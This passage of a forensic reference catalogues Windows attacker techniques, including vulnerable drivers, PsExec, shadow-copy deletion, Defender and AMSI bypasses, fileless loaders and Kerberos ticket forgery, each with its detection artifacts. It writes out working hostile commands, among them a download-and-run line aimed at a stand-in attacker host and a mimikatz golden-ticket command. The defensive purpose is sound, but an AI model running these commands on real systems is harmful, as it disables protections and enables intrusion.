- `HKCU\Software\Classes\CLSID\<clsid>\InprocServer32` — user-scoped, runs without admin, hijacks COM in the user's session. The `(Default)` value points to a DLL path.
- `HKLM\Software\Classes\CLSID\<clsid>\InprocServer32` — system-scoped.
- `HKCU\Software\Classes\CLSID\<clsid>\TreatAs` — redirects a CLSID to a different CLSID.
- `HKCU\Software\Classes\Wow6432Node\CLSID\<clsid>\InprocServer32` — 32-bit-on-64-bit version.

**Targeted CLSIDs (classic).**
- `{0006F03A-0000-0000-C000-000000000046}` — Outlook
- `{42aedc87-2188-41fd-b9a3-0c966feabec1}` — Shell folder for MyComputer
- The MMC snap-ins, the various shell extensions, Office add-ins.

**Detection.**
- New `HKCU\Software\Classes\CLSID\*\InprocServer32` entries are highly suspicious — most CLSIDs live in HKLM; HKCU overrides are a known persistence trick.
- Autoruns (Sysinternals) enumerates COM hijack locations.
- Sysmon EID 12/13 on `HKCU\Software\Classes\CLSID\*\InprocServer32`.

**Residue.** The DLL on disk (often in `%LOCALAPPDATA%` or `%APPDATA%`). The registry entries themselves persist forever until manually removed.

---

## 16. Bring Your Own Vulnerable Driver (BYOVD)

**What attackers do.** Drop a *signed* but *known-vulnerable* kernel driver, load it via the Service Control Manager, exploit its vulnerability to read/write kernel memory, kill EDR processes from kernel, or load unsigned drivers. Defender for Endpoint and other kernel-mode protections lose their privilege advantage.

**Catalog.** **LOLDrivers** (loldrivers.io) — the authoritative catalog, ~700+ known-vulnerable drivers as of late 2025. Each entry: filename, hash, signing authority, exploit description, kill-EDR capability. The catalog feeds Microsoft's vulnerable-driver blocklist (`HVCI` and `Driver Block Rules`) but the blocklist is opt-in and lags.

**Common abuses.**
- `RTCore64.sys` (MSI Afterburner) — arbitrary kernel R/W (CVE-2019-16098), used by Kasseika, BlackByte
- `gdrv.sys` (Gigabyte) — used to disable Defender, used by Robbinhood
- `iqvw64e.sys` (Intel network) — used by Slingshot and others
- `procexp.sys` (Sysinternals Process Explorer driver) — has been abused historically for handle manipulation
- `mhyprot2.sys` (Genshin Impact anti-cheat) — used by ransomware actors

**Detection.**
- Microsoft-Windows-Kernel-PnP/Configuration log: driver load events.
- Sysmon EID 6 (Driver loaded) — full path and hash of every loaded driver.
- Service-creation events: EID 7045 (kernel driver as service), EID 4697.
- `C:\Windows\System32\drivers\` and `%TEMP%` for files with `.sys` extension that are signed but not Microsoft-signed.
- Hash matches against the LOLDrivers feed.

**Residue.** The .sys file on disk, the registry service entry under `HKLM\SYSTEM\CurrentControlSet\Services\<servicename>`, the Setup log (`C:\Windows\INF\setupapi.dev.log`) recording driver installation.

---

## 17. PsExec residue

**What it is.** Sysinternals PsExec is the gold-standard interactive lateral-movement tool — also used by attackers nonstop. It works by copying PSEXESVC.exe to the target's ADMIN$ share, installing it as a service, communicating via named pipes, then cleaning up.

**Artifact trail.**
- **Source host (attacker side).** Process creation event for `psexec.exe` with full command line including target host name. Registry key: `HKCU\Software\Sysinternals\PsExec\EulaAccepted = 1` — first-run EULA acceptance; near-universal indicator of PsExec ever being run as that user.
- **Target host (victim side).**
  - File: `C:\Windows\PSEXESVC.exe` copied via ADMIN$.
  - **EID 4697** (Security log, "A service was installed in the system") and/or **EID 7045** (System log, same) with `ServiceName = PSEXESVC` (or whatever `-r` argument set).
  - **EID 5145** (Detailed file share access) showing `\\target\ADMIN$\PSEXESVC.exe` write from source host's IP.
  - **EID 4624** Type 3 (network logon) from source host, immediately preceded by the file write.
  - Named pipe: `\\.\pipe\psexesvc` and `\\.\pipe\psexec` created — Sysmon EID 17/18 (named pipe).
- **File hash.** PsExec is signed by Sysinternals/Microsoft. PSEXESVC.exe has a known good hash; alternate command-line wrappers (PaExec, csexec, smbexec) have different hashes.

**Alternates with similar but distinct residue.**
- **PaExec** — similar but slightly different service name (`PAExec-PID-EXENAME`).
- **smbexec.py** (Impacket) — uses BTOBTO output file mechanism; very characteristic file pattern in `C:\__output`.
- **wmiexec.py** (Impacket) — no service install; runs commands via WMI, captures output to ADMIN$. EID 4624 Type 3, no 7045.
- **atexec.py** (Impacket) — scheduled task; EID 4698 (scheduled task created).

---

## 18. Encrypted volumes / containers

### VeraCrypt / TrueCrypt
- **What.** Cross-platform full-disk and container encryption. Containers are flat files with no FS header — they look like random bytes.
- **Detection.** Entropy analysis: VeraCrypt containers have near-uniform Shannon entropy approaching 8 bits/byte. `binwalk -E file`, `ent`, custom entropy histograms. Containers also lack any recognizable FS signatures (no MFT, no superblock, no boot sector) in their first N kilobytes — but neither does an encrypted ZIP, so entropy alone is presumptive not conclusive.
- **Header signatures.** VeraCrypt encrypts its own header in the first 512 bytes, but the file *size* often matches the size of a containerized encrypted volume (256MB, 1GB, etc., round numbers being common). The presence of a `.hc` extension is also a give-away when present.
- **Forensic recourse.** Memory acquisition before shutdown — VeraCrypt keys live in non-paged pool while volumes are mounted; Volatility's `windows.truecryptpassphrase` and `windows.truecryptsummary` (legacy) plus tools like `Elcomsoft Forensic Disk Decryptor`, `Passware Kit Forensic` can recover keys from memory dumps if captured live.

### BitLocker
- **Detection.** Volumes carry a BitLocker signature: bytes 0x03 at offset 0x00 (vs 0xEB for normal NTFS), and a `-FVE-FS-` ASCII string slightly into the boot sector. `manage-bde -status` enumerates BitLocker-protected drives on a live system. Volatility 3 `windows.bitlocker` plugin extracts FVEK keys from memory dumps.
- **Recovery key locations.** AD-integrated environments back up recovery keys to AD or Azure AD (`msFVE-RecoveryInformation` object); Microsoft accounts back them up to the user's MSA. `manage-bde -protectors -get C:` on a live system shows protector types.

### Other containers
- **dm-crypt / LUKS** (Linux) — header signature `LUKS\xba\xbe` at offset 0 of the device or container. `cryptsetup luksDump` reads it.
- **APFS encrypted volume** (macOS) — APFS metadata with encryption flag set.
- **7-Zip with AES** — AES_256 marker; archive is partly readable (filenames), partly encrypted (bodies), depending on `-mhe` flag.

---

## 19. Wipe tools

### sdelete (Sysinternals)
- **What.** Single-pass or multi-pass overwrite of files or free space.
- **Behavior.** Overwrites file with zeroes, renames it through a series of dummy names (to overwrite the MFT entry's filename history), then deletes. For free space: writes a sparse file that fills the volume.
- **Residue.** File no longer recoverable, but **MFT entry index is reused later**, so the original entry may still exist and recoverable if not overwritten. ShimCache, Amcache, Prefetch, USN $J still record the file's prior existence — including its hash in Amcache. The act of running sdelete leaves Prefetch evidence for sdelete itself (`SDELETE.EXE-XXXXXXXX.pf`) and an Amcache entry. Free-space wipe leaves a characteristic pattern: every cluster in unallocated space contains zeroes, which is highly anomalous on a real-world drive.

### cipher /w
- **What.** Built-in Windows `cipher.exe /w:C:` overwrites free space with three passes (0x00, 0xFF, random).
- **Residue.** Same Prefetch + Amcache for cipher.exe; characteristic three-pass pattern in slack/unallocated.

### eraser (Heidi Computers)
- **What.** Schedules wipes via a Windows service. Multiple passes (Gutmann, DoD 5220.22-M, custom).
- **Residue.** Service registry entry, eraserlog event log channel, task scheduler entries if scheduled wipes were configured.

### shred (Linux util-linux)
- **What.** Multi-pass overwrite; `-u` removes the file after.
- **Residue.** Doesn't help on COW filesystems (btrfs, ZFS) or SSDs with FTL — shred is journal-aware on ext3+ only when `data=journal` is set. Bash history records the command; auditd records the syscalls if configured.

**Common wipe-tool tell.** A clean, suspiciously consistent unallocated-space entropy pattern (all zeroes, all 0xFF, or all-random) on a system that has been in use for months. Healthy disks have a wide variety of recoverable strings and patterns in free space; wiped disks do not.

---

## 20. Volume Shadow Copy deletion

**What attackers do.** Delete shadow copies before encrypting (ransomware) or after staging a destructive operation. Removes the "restore from snapshot" option.

**Mechanism.**
- `vssadmin.exe delete shadows /all /quiet`
- `wmic shadowcopy delete`
- PowerShell: `Get-WmiObject Win32_ShadowCopy | ForEach-Object {$_.Delete()}`
- `wbadmin delete catalog -quiet`
- Directly delete `System Volume Information\` shadow data (requires kernel/SYSTEM access)
- Diskshadow scripts

**Detection — System log EID 524.** "The backup operation that started at %1 has failed because the shadow copy was deleted." Often follows.

**Detection — System log EID 8194.** "Volume Shadow Copy Service error: Unexpected error..." with action context — shows shadow copy deletion.

**Detection — Application log EID 12289.** VSS deletion event from Windows Backup Service.

**Detection — process creation.** EID 4688 / Sysmon EID 1 on `vssadmin.exe delete shadows`, `wmic shadowcopy delete`, `wbadmin delete catalog`. This single signal is one of the most reliable ransomware predictors in existence — the pair `vssadmin delete shadows` + `bcdedit /set {default} recoveryenabled No` is essentially diagnostic.

**Detection — combined with later destructive activity.** Shadow delete followed within minutes by mass file modifications or `cipher` / encryption-extension renames is the canonical ransomware kill chain.

**Residue.** The shadow data may sometimes be partially recoverable via raw forensics — shadow copies live as differential blocks in `System Volume Information\` and can sometimes be carved. `vshadowmount` (libyal) and `vss_carver` are the tools.

---

## 21. Disable Defender

**What attackers do.** Turn off Microsoft Defender's real-time scanning, behavior monitoring, cloud submission. Critical step before dropping known-detected payloads.

**Common methods.**

- **PowerShell:**
  - `Set-MpPreference -DisableRealtimeMonitoring $true`
  - `Set-MpPreference -DisableBehaviorMonitoring $true`
  - `Set-MpPreference -DisableScriptScanning $true`
  - `Set-MpPreference -DisableIOAVProtection $true`
  - `Set-MpPreference -MAPSReporting Disabled`
  - `Set-MpPreference -SubmitSamplesConsent NeverSend`
  - `Add-MpPreference -ExclusionPath C:\Users\Public\` — exclusion-path abuse (see below)
  - `Add-MpPreference -ExclusionProcess powershell.exe` — process exclusion

- **Registry direct write** (requires SYSTEM and TamperProtection-off):
  - `HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\DisableAntiSpyware = 1`
  - `HKLM\SOFTWARE\Microsoft\Windows Defender\Real-Time Protection\DisableRealtimeMonitoring = 1`

- **Service kill:** stop `WinDefend`, `WdNisSvc`, `Sense`.

**Detection — Microsoft-Windows-Windows Defender/Operational log.**
- **EID 5001** — "Real-time Protection is disabled."
- **EID 5007** — "Configuration changed." Records the setting changed; rich context.
- **EID 5010** — "Scanning for malware and other potentially unwanted software is disabled."
- **EID 5012** — "Scanning for viruses is disabled."
- **EID 1116** / **1117** — malware detected (if anything ever was).
- **EID 5004** — Real-time protection feature configuration has changed.

**Detection — Tamper Protection.** On Windows 10 1903+ with Defender Tamper Protection enabled, most of these methods fail and generate `EID 5007` with `New Value` showing the rejected change. If Tamper Protection is off, no rejection event — but the policy change still logs.

**Detection — exclusion paths.** Defender exclusions are visible via `Get-MpPreference | Select -Expand Exclusion*`. Common abuse: exclude `C:\Users\Public`, `%TEMP%`, `C:\Windows\Tasks`. Suspicious exclusion paths in HKLM `\SOFTWARE\Microsoft\Windows Defender\Exclusions\Paths\` and `\Processes\` are classic backdoor markers.

**Residue.** The disabling event itself; the exclusion entries in the registry; the time gap between Defender stopping and the payload running.

---

## 22. EDR-bypass / unhooking

**What attackers do.** EDR products inject DLLs into user processes that hook key NTDLL functions (`NtCreateThread`, `NtAllocateVirtualMemory`, etc.) to inspect calls. Bypasses remove those hooks.

**Common techniques.**

- **Direct syscalls.** Malware embeds the syscall stubs from a clean NTDLL directly into its own code; the call goes straight to the kernel SSDT without traversing the user-mode hook. Frameworks: SysWhispers / SysWhispers2 / SysWhispers3 generate per-Windows-build syscall stubs. **Hell's Gate** (am0nsec / RtlSec, 2020) — dynamically resolves syscall numbers at runtime by walking the AddressOfFunctions array of NTDLL. **Halo's Gate** — handles cases where the target NTDLL function is hooked, by walking sibling functions and computing syscall number from neighbors.
- **NTDLL unhooking.** Read fresh NTDLL bytes from the on-disk file (or `\KnownDlls\ntdll.dll` section) and overwrite the in-process hooked bytes. Restores the original syscall stubs.
- **Manual mapping.** Load a DLL by parsing PE, mapping sections, resolving imports, and applying relocations manually — without calling LoadLibrary. PEB / LDR remain unaware.
- **Module stomping.** Load a legitimate DLL, then overwrite its `.text` section with malicious code. Image is registered in LDR (so looks normal) but executes attacker code.
- **Heaven's Gate.** On WoW64 systems, transition from 32-bit to 64-bit mode within a single process to bypass 32-bit hooks (older trick; still occasionally seen).

**Detection.**
- **Memory hash verification.** Compare in-memory NTDLL `.text` section bytes against on-disk NTDLL hash. Bypass leaves a perfectly-matching in-memory NTDLL (the unhook restored it), but baselines that captured the EDR's hooked NTDLL beforehand will see the divergence.
- **EDR self-monitoring.** Most EDRs detect hook removal as a high-severity event.
- **Volatility 3 `windows.callbacks`** — kernel callback chain alterations.
- **Suspicious thread start addresses.** Threads starting in private RWX regions (the manually mapped payload) rather than in known modules.

**Residue.** Almost nothing on disk if everything stays in memory. Network IOCs (C2) and memory captures are the only reliable artifacts.

---

## 23. MAC-time consistency attacks

**What attackers do.** Beyond timestomping individual files: backdate persistence registry keys, persistence service entries, and dropped files so the timeline shows the implant as "ancient" — predating any plausible intrusion date. Goal: defeat the consultant's instinct to look at "things that changed in the last 14 days."

**Mechanism.** PowerShell registry timestamp manipulation is harder than file timestomp — registry key `LastWriteTime` is updated on every value change, so simply changing the LastWriteTime in place is not exposed through standard APIs. Attackers typically:
- Create the key with `regedit /s` from an exported .reg file (LastWriteTime gets set to current time).
- After creation, take a registry snapshot, write the desired keys, then put the system clock back to a year ago, then re-write the keys to update LastWriteTime, then put the clock forward.
- Use kernel-mode access to write LastWriteTime directly.

**Detection.** Cross-correlate the registry key's LastWriteTime against:
- The hive file's `$STANDARD_INFORMATION` and Prefetch entries for `regedit.exe`.
- Windows Event Log timestamps of related events (4688 for the process that supposedly created the persistence).
- USN journal entries for hive files (NTUSER.DAT, SOFTWARE, SYSTEM) showing writes around the claimed "creation" time.
- System time-change events (EID 4616) — a 4616 ("The system time was changed") near a backdated key is the smoking gun.

**Residue.** EID 4616 records every system time change with old value, new value, and process that did it. Most clock-manipulation attacks leave at least two 4616 events (set back, set forward). Network time clients (w32time) also often log resyncs.

---

## 24. Image tampering — Sysmon EID 25

**What attackers do.** Modify the on-disk image of a running process or replace it after launch. Covers Process Herpaderping, Process Ghosting, and direct image overwrites.

**Detection.** **Sysmon EID 25** — "ProcessTampering" — added in Sysmon v13 (2020). Fires when:
- Image is mapped from a file that was modified after process start.
- Image is mapped from a file that has been deleted while the process runs.
- Image bytes in memory differ from the on-disk bytes.

The event captures `Image`, `ProcessId`, `Type` (`Image is replaced` or `Image is locked for unmap`).

**Residue.** Even if the disk-side file is gone or rewritten, EID 25 records what happened. Memory dump confirms.

---

## 25. WMI persistence

**What attackers do.** Subscribe a malicious "consumer" to a WMI event "filter" via a filter-to-consumer binding. When the event fires (every 5 minutes, on logon, on system idle, etc.), the consumer runs attacker code with SYSTEM privileges. Persistence survives reboots and is invisible to most autorun checkers.

**The triple.** Persistence requires three CIM-namespace objects in `root\subscription`:
1. **`__EventFilter`** — a WQL query specifying *when* to fire. Common: `SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_LocalTime' AND TargetInstance.Hour = 9`.
2. **`__EventConsumer`** — what to do. `CommandLineEventConsumer` for shell commands, `ActiveScriptEventConsumer` for VBScript/JScript, `SMTPEventConsumer` for email, `LogFileEventConsumer` for log writes.
3. **`__FilterToConsumerBinding`** — links the two.

**Notable historic cases.** APT29's POSHSPY used WMI subscription persistence. Stuxnet also. Many ransomware loaders.

**Detection.**
- **PowerShell enumeration:**
  ```
  Get-WmiObject -Namespace root\subscription -Class __EventFilter
  Get-WmiObject -Namespace root\subscription -Class __EventConsumer
  Get-WmiObject -Namespace root\subscription -Class __FilterToConsumerBinding
  ```
- **Sysmon EIDs 19, 20, 21** — dedicated WMI subscription events.
  - 19: WmiEventFilter activity detected
  - 20: WmiEventConsumer activity detected
  - 21: WmiEventConsumerToFilter activity detected
- **Microsoft-Windows-WMI-Activity/Operational log** — EIDs 5857 (provider load), 5858 (operation failure), 5859 (subscription register), 5860/5861 (filter/consumer setup).
- **Disk artifact.** WMI subscription data lives in the WBEM repository: `C:\Windows\System32\wbem\Repository\OBJECTS.DATA`. PyWMIPersistenceFinder and `WMI Repository Forensics` (CrowdStrike) parse it offline.

**Residue.** Almost always survives even after the attacker is evicted unless someone deletes the subscription objects manually. Many incidents discover years-old WMI persistence still firing.

---

## 26. Scheduled task hidden flag

**What attackers do.** Create a scheduled task with the `Hidden` XML attribute set, making it invisible to the default `schtasks /query` and Task Scheduler GUI.

**Mechanism.** Schtasks XML supports a `<Settings><Hidden>true</Hidden></Settings>` element. Tasks created with `schtasks /create /xml hidden.xml` or via the COM `ITaskService` interface can specify hidden. Some tools edit the on-disk XML directly under `C:\Windows\System32\Tasks\` and the registry `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\` to evade listing.

**Detection.**
- `schtasks /query /v /fo csv` — includes hidden tasks.
- PowerShell: `Get-ScheduledTask | where {$_.Settings.Hidden -eq $true}`.
- File-system scan of `C:\Windows\System32\Tasks\` — every task has an XML file; enumerate all and parse Hidden.
- TaskCache registry: `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tree\` lists task GUIDs; cross-reference with on-disk XML files. Mismatches = tampering.
- Microsoft-Windows-TaskScheduler/Operational: EIDs 106 (task registered), 200 (action started), 201 (action completed), 140 (updated). Security log EID 4698 (task created), 4699 (task deleted), 4702 (task updated).

**Residue.** Task XML file in `C:\Windows\System32\Tasks\`; TaskCache registry tree entries; EID 4698 / 106 from the creation; ongoing 200/201 entries for each execution.

---

## 27. Boot / UEFI persistence

**What attackers do.** Plant code that runs before the OS loader — surviving OS reinstall, sometimes surviving drive replacement.

**Categories.**
- **MBR bootkit.** Modify the master boot record on legacy BIOS systems. Code runs from real-mode at boot.
- **VBR bootkit.** Modify the volume boot record.
- **UEFI implant.** Replace or modify a DXE driver in the EFI system partition or in SPI flash. **LoJax** (APT28, 2018) — first known in-the-wild UEFI rootkit, persisted in SPI flash. **MoonBounce** (APT41, 2022) — persisted in SPI flash CORE_DXE region. **MosaicRegressor** (Kaspersky, 2020) — EFI system partition implant.
- **Secure Boot bypass.** BlackLotus (2022) — bootkit that bypassed Secure Boot via CVE-2022-21894 (Baton Drop).

**Detection.**
- **`chipsec` framework (Intel)** — reads SPI flash content, compares against vendor-published reference images.
- **CHIPSEC plugins:** `chipsec_main -m common.spi_lock`, `chipsec_main -m common.bios_wp`.
- **EFI system partition contents** — list everything in `\EFI\Microsoft\Boot\`, `\EFI\Boot\`, `\EFI\<vendor>\`. Hash and compare against expected.
- **TPM event log.** PCR values diverge from baseline when boot chain has been altered.
- **Windows Boot Configuration Database (BCD).** `bcdedit /enum all` — extra entries, modified bootmgr paths, kernel command-line tampering.
- **Volatility 3 `windows.mbrscan`** — checks for MBR changes (for legacy BIOS).

**Residue.** SPI flash content (only readable with chipsec or vendor tools); EFI system partition file changes; TPM PCR divergence; BCD entries.

---

## 28. Defender exclusion abuse

**What attackers do.** Add a Defender exclusion for a path or process before dropping payloads, then drop payload into that excluded space. Most flexible persistence-prep step.

**Commands.**
- `Add-MpPreference -ExclusionPath C:\Users\Public\Music\`
- `Add-MpPreference -ExclusionExtension .tmp`
- `Add-MpPreference -ExclusionProcess powershell.exe`
- `Add-MpPreference -ControlledFolderAccessAllowedApplications evil.exe` — bypass for Controlled Folder Access (ransomware protection).

**Registry locations.**
- `HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions\Paths\<path> = 0`
- `HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions\Extensions\<ext> = 0`
- `HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions\Processes\<proc> = 0`
- Group Policy: `HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Exclusions\*`

**Detection.**
- Sysmon EID 13 (registry value set) on those keys.
- Defender Operational log EID 5007 (configuration changed) — includes path and value.
- `Get-MpPreference | Select -Expand Exclusion*` — current state.

**Common suspicious exclusions.** `C:\Users\Public`, `C:\ProgramData\<random>`, `C:\Windows\Temp`, `C:\Tasks`. Legitimate exclusions are usually narrow (a specific software installation directory, a database file).

---

## 29. PowerShell logging bypass

**Why PowerShell logging matters.** Modern Windows (5.1+) supports:
- **Module logging** (`Microsoft-Windows-PowerShell/Operational` EID 4103) — cmdlet pipeline executions.
- **Script Block logging** (EID 4104) — every script block compiled and run; "deobfuscation by Microsoft" since the engine logs the decoded form.
- **Transcription** (text log of every PS session).

**Bypass techniques.**
- **ConstrainedLanguageMode.** `$ExecutionContext.SessionState.LanguageMode = "ConstrainedLanguage"` to limit what payloads can do; or, *reverse*, set back to FullLanguage from constrained.
- **AMSI bypass** — see next technique. AMSI catches the malicious content *before* logging in some configurations.
- **ScriptBlock logging via reflection:** `[Ref].Assembly.GetType('System.Management.Automation.ScriptBlock').GetField('signatures','NonPublic,Static').SetValue($null,(New-Object Collections.Generic.HashSet[string]))` — old, patched, sometimes still works on unpatched.
- **Downgrade to PowerShell v2.** `powershell.exe -Version 2` — v2 doesn't support module/scriptblock logging at all. If `powershell-v2` Windows feature is still installed (default-off on Windows 10+), this is a valid bypass. Detection: EID 400 with `EngineVersion=2.0`.
- **Encoded commands.** `-EncodedCommand <base64>` — encoded payload, but script block logging captures the *decoded* form, so logging still defeats it in modern Windows. Used mainly to evade glob-style command-line detection.
- **Obfuscation.** Invoke-Obfuscation, ISESteroids, manual string tricks. Script block logging decodes one layer; multi-layer obfuscation still mostly logs the inner form.

**Detection.**
- EID 400 with `EngineVersion=2.0` — PS v2 fallback indicator.
- EID 4104 with `MessageNumber=1 of 1` and `Level=5` (verbose) — script blocks above a length threshold (~500 chars) are logged at warning level if they contain "suspicious" cmdlets per Microsoft's list (Invoke-Expression, IEX, Add-Type, Reflection.Assembly, etc.).
- EID 600 — provider lifecycle events.
- Missing 4104 / 4103 events for processes that demonstrably ran PowerShell (Prefetch shows powershell.exe ran, Sysmon EID 1 has command line, but no 4104 in the timeframe) — logging was bypassed or disabled.

---

## 30. AMSI bypass techniques

**What AMSI is.** Anti-Malware Scan Interface — Windows feature (Win10+, Server 2016+) that lets AMSI-enlightened scripting engines (PowerShell, JScript, VBScript, .NET, WMI, Excel 4.0 macros via Office) submit content to the registered antivirus for scanning before executing. Defender uses it; third-party AVs can register.

**Common bypasses.**
- **`amsi.dll` in-memory patch.** Find `AmsiScanBuffer` in the process's amsi.dll, patch its first bytes to `mov eax, 0x80070057` + `ret` (return AMSI_RESULT_INVALID_PARAMETER); content is never scanned. The Matt Graeber one-liner: `[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)`.
- **`amsi.dll` provider unregister.** Set HKLM\SOFTWARE\Microsoft\AMSI\Providers to an invalid CLSID; amsi.dll loads "no provider" and returns clean. Requires admin.
- **COM hijack of MpOav.dll.** MpOav.dll is Defender's AMSI provider. Hijack its COM CLSID in HKCU.
- **Process-handle revocation.** Open amsi.dll's `g_amsiContext` HANDLE field and corrupt it.

**Detection.**
- **AMSI bypass strings** in EID 4104 script blocks: `amsiInitFailed`, `AmsiScanBuffer`, `AmsiUtils`, `0x80070057`, common amsi.dll patch hex sequences (`b8 57 00 07 80 c3` is the classic patch).
- Even *attempting* the bypass via the Graeber technique is itself logged in EID 4104, because the strings naming AMSI internals are flagged.
- Defender Operational log: provider load failure events.

---

## 31. In-memory execution / fileless

**What attackers do.** Run payloads entirely in memory. No file on disk. Bypasses every disk-based AV scan.

**Common loaders.**
- **PowerShell Empire / PowerSploit / PowerShell Mafia.** `IEX (New-Object Net.WebClient).DownloadString('http://attacker/x.ps1')`. Loads PS code from URL, executes; no .ps1 file ever lands.
- **Cobalt Strike beacon.** Reflective DLL load into a process; communicates with team server via HTTP, HTTPS, DNS, SMB pipes.
- **Covenant Grunt.** .NET-based; loads via assembly.Load() bytes from C2.
- **Sliver.** Go-based; in-memory implants.
- **Brute Ratel C4.** Commercial; popular with serious actors in 2022-2024.

**Detection — disk side.** Almost nothing. ShimCache / Amcache might show powershell.exe ran. Prefetch for powershell.exe. That's about it.

**Detection — memory side (Volatility 3).**
- `windows.malfind` — RWX private regions with code, especially with shellcode signatures or PE headers.
- `windows.ldrmodules` — modules present in memory but not in PEB load lists (reflective DLLs).
- `windows.dlllist` vs VAD-tree disagreement.
- `windows.callbacks` — kernel callbacks.
- `windows.cmdline` — long encoded PowerShell command lines that don't appear in any on-disk script.

**Detection — log side.**
- Sysmon EID 1 with PS command line including `IEX`, `Invoke-Expression`, `DownloadString`, `DownloadFile`, `Net.WebClient`, `Bypass`, `EncodedCommand`, `-enc`.
- EID 4104 with the decoded malicious content (when scriptblock logging is on).
- Sysmon EID 3 (network connection) from powershell.exe to non-Microsoft IPs.

**Detection — network side.** C2 traffic patterns: regular beacon intervals (often with jitter), uniform packet sizes, HTTPS to recently-registered domains, DNS over HTTPS to unexpected resolvers.

---

## 32. Krbtgt and Kerberos abuse

### Golden Ticket
- **What.** Attacker who has compromised the krbtgt account's NTLM hash (the domain controller's domain master key) can mint TGTs for any account, including non-existent ones, with arbitrary group memberships (Domain Admins, Enterprise Admins, etc.), valid for up to 10 years.
- **Generation.** `mimikatz # kerberos::golden /user:fakeuser /domain:corp.local /sid:S-1-5-... /krbtgt:<hash> /id:500 /groups:512,513,518,519,520 /ptt`.
- **Detection.**
  - Mimikatz default ticket lifetime: 10 years. Anything > the domain max (typically 10 hours) is diagnostic.
  - EID 4769 (Kerberos service ticket request) with a TGT presented for a username that does not exist in AD.
  - EID 4624 followed by EID 4672 (special privileges) for a user whose TGT was never issued (no 4768 for that user).
  - krbtgt password not rotated — `Get-ADUser krbtgt -Properties PasswordLastSet` showing >180 days old is a vulnerability indicator.
- **Defense.** Rotate krbtgt twice (12-24h apart), invalidating all extant TGTs. AD security baselines now recommend rotation every 180 days.

### Silver Ticket
- **What.** Forged service ticket using the *service account's* NTLM hash (not krbtgt). Smaller blast radius — only that service — but no traffic to the DC because TGS is forged, not requested.
- **Detection.** Hard, because the DC never sees the request. The targeted service logs successful auths (EID 4624) from a session that never had a TGT request (no 4768). Cross-correlation across DC and member server logs.

### krbtgt password roll detection
- EID 4724 (password reset) on krbtgt — should *always* be a planned operation; unexpected resets are suspicious (could be attacker covering tracks).
- `Get-ADUser krbtgt -Properties PasswordLastSet, msDS-KeyVersionNumber` — `msDS-KeyVersionNumber` increments on each rotation.

### Kerberoasting (T1558.003)
- **What.** Any authenticated domain user can request a TGS for any service principal name (SPN). The TGS is encrypted with the service account's NTLM hash. Offline crack the TGS to recover the password. Service accounts with weak passwords and SPN-set are the targets.
- **Detection.**
  - EID 4769 with `Service Name` not equal to `krbtgt`, `Ticket Encryption Type` = `0x17` (RC4-HMAC, classic Kerberoasting flavor; tools default to RC4 because faster to crack). Flag = 0x12 / 0x40810010.
  - **Honeyaccounts** — create a service account, set an SPN, alert if its TGS is ever requested.
  - Volume: an attacker enumerating SPNs and requesting tickets generates a burst of 4769 events from a single source.

### AS-REP Roasting (T1558.004)
- **What.** Accounts with `DONT_REQ_PREAUTH` flag (UAC `0x400000`) can be asked to issue an AS-REP without pre-authentication. The AS-REP contains material encrypted with the user's password hash — offline crackable. Legacy / poorly-configured accounts often have this flag.
- **Detection.**
  - EID 4768 (TGT request) with `Pre-Authentication Type = 0` — diagnostic for AS-REP roasting.
  - `Get-ADUser -Filter 'useraccountcontrol -band 4194304'` enumerates accounts vulnerable to it; alerts when any of those accounts has 4768 Pre-Auth=0 activity.

---

## 33. Account log obfuscation

**What attackers do.** Reset audit policy or clear the Security log to hide their activity. The full clear is the previous section's "log clearing" — this section is about subtler manipulations.

**`auditpol /clear`** — clears the per-user audit policy without clearing the events themselves. Future events won't be logged for the affected categories until policy is re-set. Detection: EID 4719 ("System audit policy was changed") with details.

**`auditpol /set /category:* /success:disable /failure:disable`** — disable all auditing categories. Detection: EID 4719 for each category change.

**Registry direct write to audit policy:** `HKLM\Security\Policy\PolAdtEv` (SECURITY hive, requires SYSTEM). Edits there bypass auditpol's logging but are picked up by hive-write monitoring (Sysmon EID 12/13).

**Detection summary.** EID 4719 is the canonical event; whenever audit policy actually changes through approved APIs, it fires. Unexpected 4719 events near other suspicious activity are nearly always intentional.

---

## 34. Time manipulation

**What attackers do.** Change system time before performing actions, then restore. Goal: scramble timelines, defeat correlation, antedate persistence.

**Mechanism.**
- `w32tm /config /manualpeerlist:bad.ntp.server /syncfromflags:manual /update`
- `Set-Date -Date "2018-06-01 14:30"` (PowerShell, requires SeSystemtimePrivilege)
- `net time \\target /set` — set time on a remote system
- Direct call to `SetSystemTime` API

**Detection.**
- **EID 4616** — "The system time was changed." Includes:
  - `Process Name`
  - `Previous Time`
  - `New Time`
  - `Subject User`
  
  4616 is the smoking gun; every legitimate time change (NTP sync, manual correction, VM clock jump) generates one. Look for 4616 followed by suspicious activity, then another 4616 setting clock forward.

- **Sysmon time-skew detection.** Sysmon logs UTC consistently; correlating against the local Windows clock surfaces drift.

- **NTP / Microsoft-Windows-Time-Service log** — EIDs 35, 37, 38, 47, 50 — track NTP sync events.

- **File-system inconsistency.** Sub-second precision again: a file "created" by a clock-rolled-back operation will have an out-of-band CreationTime relative to its position in the MFT entry sequence. MFT entries are allocated in real time, so the sequence number (or USN sequence) is monotonic, but the SI CreationTime can be backdated. Cross-correlation surfaces it.

---

## 35. Other notable techniques (compressed)

- **ETW patching.** Patch `ntdll!EtwEventWrite` and `ntdll!EtwEventWriteFull` in process memory to nop the ETW provider; Sysmon and Defender event collection breaks for that process. Variants patch `ntdll!NtTraceEvent` further upstream. The patch is usually a 5-byte `xor eax, eax; ret` or `mov eax, 0; ret` overwrite at the function prologue. Detection: in-memory NTDLL hash diff against on-disk NTDLL; an ETW-blind process is its own anomaly. Sealighter and similar instrumented ETW collectors can detect provider-failure side-channels. Some EDRs have moved to kernel-mode telemetry sources (kernel ETW or PsSetCreateProcessNotifyRoutine) that user-mode patches cannot defeat.

